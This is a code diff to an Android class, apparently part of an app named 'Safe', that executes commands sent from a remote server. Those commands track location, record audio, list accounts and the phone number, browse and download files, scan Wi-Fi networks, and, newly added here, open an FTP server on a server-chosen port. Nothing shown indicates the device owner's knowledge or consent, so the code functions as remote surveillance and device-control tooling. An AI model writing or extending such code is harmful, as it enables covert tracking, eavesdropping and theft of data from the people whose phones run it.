@@ -5,6 +5,8 @@ import android.accounts.AccountManager;
 import android.app.AlertDialog;
 import android.content.Context;
 import android.content.Intent;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
 import android.net.wifi.ScanResult;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
@@ -12,6 +14,7 @@ import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Environment;
 import android.telephony.TelephonyManager;
+import android.text.format.Formatter;
 import android.widget.Toast;
 
 import java.io.File;
@@ -27,21 +30,26 @@ public class SafeCommands {
     private SafeCommunications comms;
     private SafeLogger logger;
     private SafeLocations locs;
+    private SafeFTPServer ftpServer;
     private String simpleId;
 
-    private static final String[] COMMANDS = {"respond", "location start", "location stop",
-            "audio start", "audio record", "audio stop", "toast ", "dialog ", "wifi",
-            "accounts", "phone number", "ls ", "download ", "commands", "version", "app", "address",
-            "timeout ", "status", "getlog", "ftp start", "ftp stop"};
+    // TODO make key value pair
+    private static final String[] COMMANDS = {
+            "respond", "location start", "location stop", "location single",
+            "audio start", "audio stop", "toast ", "dialog ", "wifi",
+            "accounts", "phone number", "ls ", "download ", "commands",
+            "version", "app", "address", "timeout ", "status", "getlog",
+            "ftp start", "ftp stop"};
 
 
     public SafeCommands(Context context, SafeCommunications comms, SafeLogger logger,
-                        SafeLocations locs, SafeAudio audio, String simpleId) {
+                        SafeLocations locs, SafeAudio audio, SafeFTPServer ftpServer, String simpleId) {
         this.context = context;
         this.comms = comms;
         this.logger = logger;
         this.locs = locs;
         this.audio = audio;
+        this.ftpServer = ftpServer;
         this.simpleId = simpleId;
     }
 
@@ -54,8 +62,9 @@ public class SafeCommands {
             locs.startLocations();
         } else if (fromServer.equalsIgnoreCase(COMMANDS[2])) {
             locs.stopLocations();
-        } else if (fromServer.equalsIgnoreCase(COMMANDS[3]) ||
-                fromServer.equalsIgnoreCase(COMMANDS[4])) {
+        } else if (fromServer.equalsIgnoreCase(COMMANDS[3])) {
+            locs.getSingleLocation();
+        } else if (fromServer.equalsIgnoreCase(COMMANDS[4])) {
             audio.startRecording();
         } else if (fromServer.equalsIgnoreCase(COMMANDS[5])) {
             audio.stopRecording();
@@ -88,17 +97,37 @@ public class SafeCommands {
             SafeService.setSoTimeOut(fromServer.substring(COMMANDS[17].length(), fromServer.length()));
         } else if (fromServer.equalsIgnoreCase(COMMANDS[18])) {
             sayStatus();
-        } else if (fromServer.equalsIgnoreCase(COMMANDS[18])) {
-            comms.upload(logger.logfile());
         } else if (fromServer.equalsIgnoreCase(COMMANDS[19])) {
-        } else if (fromServer.equalsIgnoreCase(COMMANDS[20])) {
+            comms.upload(logger.logfile());
+        } else if (fromServer.startsWith(COMMANDS[20])) {
+            try {
+                String stringPort = fromServer.substring(COMMANDS[20].length() + 1, fromServer.length());
+                try {
+                    int port = Integer.parseInt(stringPort);
+                    ftpServer.startServer(port);
+                } catch (NumberFormatException e) {
+                    comms.say("Not a valid port: \'" + stringPort + "\'");
+                }
+            } catch (StringIndexOutOfBoundsException e) {
+                comms.say("Not a valid command, need \"ftp start port_num\"");
+            }
+        } else if (fromServer.equalsIgnoreCase(COMMANDS[21])) {
+            ftpServer.stopServer();
         }
     }
 
     private void getWiFiNetworks() {
+        ConnectivityManager connManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
         WifiManager wifiMgr = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
         WifiInfo wifiInfo = wifiMgr.getConnectionInfo();
-        comms.say("Connected to: " + wifiInfo.getSSID() + " " + wifiInfo.getBSSID() + " " + wifiInfo.getMacAddress());
+        if(mWifi.isConnected()) {
+            comms.say("Connected to: " + wifiInfo.getSSID() + " " + wifiInfo.getBSSID() + " " + wifiInfo.getMacAddress());
+            comms.say("IP address  : " + Formatter.formatIpAddress(wifiInfo.getIpAddress()));
+        } else {
+            comms.say("Wifi not connected");
+        }
+        comms.say("Nearby access points:");
         List<ScanResult> results = wifiMgr.getScanResults();
         for (ScanResult result : results) {
             comms.say(result.SSID + " " + result.BSSID + " " + result.level);
@@ -155,22 +184,6 @@ public class SafeCommands {
         i.putExtra("message", message.substring(7, message.length()));
         i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         context.startActivity(i);
-        /*new AsyncTask<String, Void, String>() {
-            @Override
-            protected String doInBackground(String[] params) {
-                String str = params[0];
-                return str.substring(7, str.length());
-            }
-
-            @Override
-            protected void onPostExecute(String message) {
-                AlertDialog.Builder builder = new AlertDialog.Builder(context.getApplicationContext());
-                builder.setMessage(message)
-                        .setTitle("");
-                AlertDialog dialog = builder.create();
-                dialog.show();
-            }
-        }.execute(message);*/
     }
 
     private void listDir(String dir) {
@@ -180,8 +193,12 @@ public class SafeCommands {
         try {
             File directory = new File(Environment.getExternalStorageDirectory(), dir);
             File[] listOfFiles = directory.listFiles();
-            for (File file : listOfFiles) {
-                comms.say(file.getName());
+            if(listOfFiles.length > 0) {
+                for (File file : listOfFiles) {
+                    comms.say(file.getName());
+                }
+            } else {
+                comms.say("Directory is empty");
             }
         } catch (NullPointerException e) {
             comms.say("w00ps");
